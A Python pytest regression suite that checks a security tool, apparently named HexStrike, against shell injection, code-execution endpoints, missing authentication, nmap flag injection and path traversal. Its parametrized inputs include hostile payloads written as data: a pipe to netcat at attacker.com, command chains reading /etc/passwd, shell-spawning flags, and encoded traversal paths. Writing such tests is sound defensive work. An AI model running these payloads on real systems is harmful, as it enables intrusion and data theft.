"""
Comprehensive regression suite for the 5 assigned HexStrike CVEs plus adjacent bypasses:
- CVE-2025-35028: EnhancedCommandExecutor / SafeSubprocessRunner shell injection
- CVE-2026-90619: Execute/script/package endpoints arbitrary code execution
- CVE-2026-90620: Missing authentication across HTTP endpoints & loopback default
- CVE-2026-90690: Tool parameter & flag injection across target, ports, and additional_args
- CVE-2026-90691: FileOperationsManager / ConfinedWorkspace path traversal & link escape
"""

from __future__ import annotations

import os
import sys
from pathlib import Path

import pytest

from hexstrike.application.services import HexStrikeRuntime
from hexstrike.execution.runner import ExecutionSecurityError, SafeSubprocessRunner
from hexstrike.policy.engine import PolicyViolationError
from hexstrike.transports.http_server import create_http_app
from hexstrike.workspace.confined_fs import ConfinedWorkspace
from hexstrike_server import EnhancedCommandExecutor, FileOperationsManager


# ============================================================================
# CVE-2025-35028: Command Executor Shell Injection Regression + Negative Control
# ============================================================================


def test_cve_2025_35028_rejects_raw_shell_command_string() -> None:
    runner = SafeSubprocessRunner()
    with pytest.raises(ExecutionSecurityError):
        runner.run("echo hello; touch /tmp/pwned")  # type: ignore[arg-type]

    executor = EnhancedCommandExecutor("id; uname -a")  # type: ignore[arg-type]
    with pytest.raises(ExecutionSecurityError):
        executor.execute()


def test_cve_2025_35028_shell_metacharacters_are_inert_in_argv(tmp_path: Path) -> None:
    sentinel = tmp_path / "sentinel_must_not_exist.txt"
    runner = SafeSubprocessRunner()
    payload = f"benign_value; touch {sentinel} && $(touch {sentinel})"
    res = runner.run([sys.executable, "-c", "import sys; print(sys.argv[1])", payload], timeout=5)
    assert res.success is True
    assert payload in res.stdout
    assert not sentinel.exists(), "Shell injection payload executed a side-effect command!"


def test_cve_2025_35028_negative_control_valid_argv_execution() -> None:
    executor = EnhancedCommandExecutor([sys.executable, "-c", "print('authorized_check_ok')"], timeout=5)
    out = executor.execute()
    assert out["success"] is True
    assert out["return_code"] == 0
    assert "authorized_check_ok" in out["stdout"]


# ============================================================================
# CVE-2026-90619 & CVE-2026-90620: Unauthenticated & Arbitrary Code Execution
# ============================================================================


def test_cve_2026_90620_unauthenticated_requests_denied(tmp_path: Path) -> None:
    rt = HexStrikeRuntime(state_dir=tmp_path)
    app = create_http_app(runtime=rt, api_token="test-secret-token-12345")
    client = app.test_client()

    # Health and OAuth resource metadata are public with minimal disclosure
    r_health = client.get("/health")
    assert r_health.status_code == 200

    # All operational and file routes must return 401 without valid Bearer token
    for method, route in [
        ("POST", "/api/command"),
        ("POST", "/api/python/execute"),
        ("POST", "/api/python/install"),
        ("POST", "/api/process/execute-async"),
        ("POST", "/api/error-handling/execute-with-recovery"),
        ("POST", "/api/files/create"),
        ("POST", "/api/files/modify"),
        ("DELETE", "/api/files/delete"),
        ("GET", "/api/files/list"),
        ("POST", "/api/tools/nmap"),
        ("GET", "/api/v6/status"),
        ("POST", "/api/v6/jobs/start"),
    ]:
        resp = client.open(route, method=method, json={"target": "127.0.0.1"})
        assert resp.status_code == 401, f"Route {method} {route} allowed unauthenticated access!"
        assert "WWW-Authenticate" in resp.headers


def test_cve_2026_90620_forbids_token_in_query_parameter(tmp_path: Path) -> None:
    rt = HexStrikeRuntime(state_dir=tmp_path)
    app = create_http_app(runtime=rt, api_token="test-secret-token-12345")
    client = app.test_client()

    resp = client.get("/api/v6/status?token=test-secret-token-12345")
    assert resp.status_code == 400
    assert resp.get_json()["code"] == "QUERY_CREDENTIAL_FORBIDDEN"


def test_cve_2026_90619_retired_arbitrary_execution_endpoints_return_410_even_when_authenticated(
    tmp_path: Path,
) -> None:
    rt = HexStrikeRuntime(state_dir=tmp_path)
    token = "test-secret-token-12345"
    app = create_http_app(runtime=rt, api_token=token)
    client = app.test_client()
    headers = {"Authorization": f"Bearer {token}"}

    for route, payload in [
        ("/api/command", {"command": "id"}),
        ("/api/python/execute", {"script": "import os; os.system('id')"}),
        ("/api/python/install", {"package": "malicious-pkg"}),
        ("/api/process/execute-async", {"command": "id"}),
        ("/api/error-handling/execute-with-recovery", {"command": "id"}),
    ]:
        resp = client.post(route, json=payload, headers=headers)
        assert resp.status_code == 410, f"Unsafe route {route} was not retired!"
        data = resp.get_json()
        assert data["success"] is False
        assert data["code"] == "ENDPOINT_RETIRED_UNSAFE"


# ============================================================================
# CVE-2026-90690: Tool Parameter & Option Injection Regression + Negative Control
# ============================================================================


@pytest.mark.parametrize(
    "malicious_target",
    [
        "127.0.0.1; id",
        "127.0.0.1 && cat /etc/passwd",
        "127.0.0.1 | nc attacker.com 4444",
        "127.0.0.1 `id`",
        "127.0.0.1 $(id)",
        "--script=exploit.nse",
        "-oN /etc/cron.d/pwn",
    ],
)
def test_cve_2026_90690_blocks_target_and_option_injection(tmp_path: Path, malicious_target: str) -> None:
    rt = HexStrikeRuntime(state_dir=tmp_path)
    with pytest.raises(PolicyViolationError):
        rt.action_prepare(
            capability_id="network.nmap",
            operation="scan",
            arguments={"target": malicious_target},
        )


@pytest.mark.parametrize(
    "dangerous_flag",
    [
        ["--script=http-SQLi.nse"],
        ["-iL", "/etc/passwd"],
        ["-oN", "/tmp/outside.txt"],
        ["--datadir=/tmp/evil"],
        ["--os-shell"],
        ["--exec=sh"],
        ["-T4; id"],
    ],
)
def test_cve_2026_90690_blocks_dangerous_extra_flags(tmp_path: Path, dangerous_flag: list[str]) -> None:
    rt = HexStrikeRuntime(state_dir=tmp_path)
    with pytest.raises(PolicyViolationError):
        rt.action_prepare(
            capability_id="network.nmap",
            operation="scan",
            arguments={"target": "127.0.0.1", "extra_flags": dangerous_flag},
        )


def test_cve_2026_90690_negative_control_valid_nmap_plan(tmp_path: Path) -> None:
    rt = HexStrikeRuntime(state_dir=tmp_path)
    prep = rt.action_prepare(
        capability_id="network.nmap",
        operation="scan",
        arguments={"target": "127.0.0.1", "profile": "quick", "ports": "80,443"},
    )
    assert prep["success"] is True
    argv = prep["plan"]["argv_preview"]
    assert "--" in argv
    assert argv[-1] == "127.0.0.1"


# ============================================================================
# CVE-2026-90691: ConfinedWorkspace / FileOperationsManager Path Traversal
# ============================================================================


@pytest.mark.parametrize(
    "traversal_path",
    [
        "../escape.txt",
        "../../etc/passwd",
        "subdir/../../escape.txt",
        "/etc/passwd",
        "/tmp/outside_file.txt",
        "..\\..\\windows\\system32\\cmd.exe",
        "C:\\Windows\\win.ini",
        "\\\\attacker\\share\\payload.dll",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%252e%252e%252fescape.txt",
        "valid_name\x00.txt",
    ],
)
def test_cve_2026_90691_blocks_path_traversal_across_all_operations(
    tmp_path: Path, traversal_path: str
) -> None:
    outside_sentinel = tmp_path / "outside_sentinel.txt"
    outside_sentinel.write_text("MUST_REMAIN_INTACT", encoding="utf-8")

    ws_root = tmp_path / "confined_root"
    fm = FileOperationsManager(base_dir=ws_root)

    res_create = fm.create_file(traversal_path, "malicious")
    assert res_create["success"] is False
    assert res_create.get("code") == "PATH_CONFINEMENT_VIOLATION"

    res_mod = fm.modify_file(traversal_path, "malicious")
    assert res_mod["success"] is False

    res_del = fm.delete_file(traversal_path)
    assert res_del["success"] is False

    res_list = fm.list_files(traversal_path)
    assert res_list["success"] is False

    assert outside_sentinel.read_text(encoding="utf-8") == "MUST_REMAIN_INTACT"


def test_cve_2026_90691_blocks_symlink_and_hardlink_escape(tmp_path: Path) -> None:
    outside_secret = tmp_path / "outside_secret.txt"
    outside_secret.write_text("TOP_SECRET_HOST_DATA", encoding="utf-8")

    ws_root = tmp_path / "confined_root"
    ws = ConfinedWorkspace(base_dir=ws_root)

    # Plant a symlink inside workspace pointing outside
    symlink_path = ws.base_dir / "evil_symlink.txt"
    symlink_path.symlink_to(outside_secret)

    assert ws.read_file("evil_symlink.txt")["success"] is False
    assert ws.modify_file("evil_symlink.txt", "overwrite")["success"] is False
    assert ws.delete_file("evil_symlink.txt")["success"] is False
    assert outside_secret.read_text(encoding="utf-8") == "TOP_SECRET_HOST_DATA"

    # Plant a hardlink inside workspace pointing outside
    hardlink_path = ws.base_dir / "evil_hardlink.txt"
    os.link(outside_secret, hardlink_path)
    assert ws.read_file("evil_hardlink.txt")["success"] is False
    assert ws.modify_file("evil_hardlink.txt", "overwrite")["success"] is False
    assert outside_secret.read_text(encoding="utf-8") == "TOP_SECRET_HOST_DATA"


def test_cve_2026_90691_negative_control_valid_workspace_lifecycle(tmp_path: Path) -> None:
    ws = ConfinedWorkspace(base_dir=tmp_path / "ws")
    c_res = ws.create_file("reports/scan_notes.txt", "Initial finding")
    assert c_res["success"] is True

    m_res = ws.modify_file("reports/scan_notes.txt", "\nSecond finding", append=True)
    assert m_res["success"] is True

    r_res = ws.read_file("reports/scan_notes.txt")
    assert r_res["success"] is True
    assert "Initial finding\nSecond finding" in r_res["content"]

    l_res = ws.list_files("reports")
    assert l_res["success"] is True
    assert len(l_res["files"]) == 1

    d_res = ws.delete_file("reports/scan_notes.txt")
    assert d_res["success"] is True
